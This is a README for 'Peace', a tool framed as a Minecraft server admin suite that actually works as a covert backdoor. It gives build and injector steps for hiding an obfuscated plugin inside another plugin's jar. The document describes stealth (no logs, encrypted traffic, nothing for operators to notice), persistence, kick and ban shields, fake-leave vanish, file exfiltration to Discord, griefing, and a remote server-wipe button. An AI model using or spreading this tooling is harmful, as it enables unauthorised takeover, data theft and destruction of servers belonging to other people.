# Peace

The Minecraft server admin suite that fits in one jar.

Peace turns an in-game client into a remote desktop for any server you control. Press
RIGHT SHIFT (or the logo on the title/pause menus) and a grid of apps opens — Terminal,
Files, Admin, Griefing, Settings, Servers, Danger. Every action travels as an
AES-256-GCM-encrypted frame on a registration-free connection, so there is no plugin-message
channel, no plaintext traffic, and nothing extra for a server operator to notice.

## Why it should be your first tool

- **Instant ownership.** Drop one merged plugin jar into `plugins/`, join the server, and
  you have console, files, and admin control before anyone has time to blink. That's it.
- **Invisible by default.** There is no standalone Peace plugin on disk — the injector folds
  it into any other plugin's jar and instruments it at bytecode level. On the wire there is
  *no* plugin-message channel to detect, only ciphertext on the ordinary connection stream.
  It ships obfuscated and silent: no chats, no console lines, no logs.
- **Alive in hostile rooms.** Access doesn't end when you lose the file. If Peace is ever
  dropped back onto the disk it re-advertises itself (peaceping), your client finds the
  server again without you doing anything, and kick/ban shields put you back in instantly.
- **Everything remote.** Run commands, watch the live server console stream back, browse and
  edit files, pardon kicks and bans, or pull the plug — all from inside the game or its menus.
- **One key, one package.** A single constant PSK is baked into every artifact by the
  injector. No per-server secrets, no account juggling; if the key fits the frame, the frame works.

## Features

- **Terminal** — the full server console at your fingertips, with output streaming back over
  the same encrypted link.
- **Files** — browse, edit, copy, delete, and send files straight to Discord.
- **Admin** — kick players; shields that pardon kicks and bans; auto-whitelist on key proof;
  silent join and full vanish (fake leave message, hidden from tab and from everyone online).
- **Griefing** — a targeted wand with misclick guards and a right-shift safety.
- **Servers** — Peacepings auto-add your servers; every entry carries an online/offline dot.
- **Danger** — two-click, time-armed server wipe and shutdown buttons for when the machine
  stops being useful.
- **Settings** — every option lives in one merged `config.yml`: `psk`, `auth`, `protected`
  shields, `announce`, `diagnostic`.

## Quick start

Requirements: Java 25+ for the builds, and a Fabric 26.2 client (the mod pins its exact
loader/API versions in `mod/gradle.properties`).

1. Build the plugin — `cd plugin && gradle build`. You get the obfuscated `Peace.jar` plus
   its `mapping.txt` and the canonical `config.yml`.
2. Build the mod — `cd mod && gradle build`. Drop `peace-mod-<version>.jar` into your
   Fabric client's `mods` folder. Create `mods/<profile>/peace.txt` containing the PSK.
3. Build and run the injector — `cd injector && ./build_injector.sh && java -jar Injector.jar`.
   Pick the seed plugin you want Peace hidden in, an output path, and your required `auth`
   list. The output `bundle/Core.jar` goes straight into `server/plugins/`; the PSK is
   baked in for you.
4. Join the server, press RIGHT SHIFT, done.

On first boot the merged plugin posts one peaceping (`peaceping <host>:<port> online`) to
your Discord channel and `offline` on clean stop; the Servers app discovers it and adds it
automatically. Peaceping is optional and off by default.

## Advanced

### How the messaging works

- **No plugin-message channel.** None of the Bukkit/Forge/Fabric messaging APIs are used and
  nothing is registered in the handshake. On the server each connection gets a small
  passthrough (`peace-raw`) in its packet pipeline; the mod hooks the same stream. The two
  ends exchange frames directly on the raw connection byte stream.
- **Every op is a frame.** `{"op":...}` JSON is packed with a length prefix, then wrapped in
  AES-256-GCM with a per-frame random 12-byte IV. The 128-bit auth tag doubles as the PSK
  proof: a frame from the wrong key cannot decrypt and cannot authenticate, so it is dropped.
  On the wire a scanner sees only random ciphertext.
- **Packet ids are discovered, not hardcoded.** The plugin reads the packet-type ids from the
  live wire codec on the first real packet. Clients built against the remapped (intermediary)
  runtime — where codec symbols are renamed — fall back to the built-in ids for the 26.2 play
  protocol (serverbound `22`, clientbound `24`); a real observation on the wire overrides it.
- **Self-check on join.** Every fresh connection pings once; the plugin answers with a pong.
  One round trip proves the whole channel.
- **The console comes to you.** Server console output is captured and streamed to your
  subscribed client over the same encrypted frames, so nothing admin-related leaves the
  channel except the optional peaceping ads.
- **What does touch Discord?** Only peaceping — one `online` post on start, one `offline`
  post on stop (`announce.enabled: false` by default).
- **In-test switch.** A localhost web console (`debug.web`) exposes raw counters and
  last-ditch controls for bring-up testing. Off by default; never enable it on a real
  deployment.

### Auth list

Baked into the merged `config.yml` by the injector; at least one name or UUID is required.
A player may use Peace only if they both hold the PSK **and** are in `auth`. Operators who
fail the key proof are ignored outright.

### Peaceping discovery

The `announce` block (`enabled`, `token`, `channel`, `host`, `port`) controls the
online/offline posts. Only peaceping travels through Discord; every other op stays in the
encrypted channel.

### CLI merge

`Inject <seed.jar> <out.jar> [config.yml]` uses the injector's embedded copies of Peace and
the mapping; the legacy form `Inject <seed.jar> <peace.jar> <mapping.txt> <out.jar>` takes
explicit jars.

### File manager context menu

Right-click a row in Files for Edit, Copy..., Delete, and Send to Discord — the opened file
uploads to your announce channel as an attachment.

### Danger app

Destructive buttons arm on the first click and fire on the second within 5 seconds, guarding
against misclicks on "Delete server files" (wipes the server directory after 80 ticks) and
"Shutdown" (stops the process).

### Diagnostic mode

Set `diagnostic: true` in the merged `config.yml` to surface service events (packet-id
resolution, spread persistence) in the server log. Everything else stays silent; spread
events never log by default.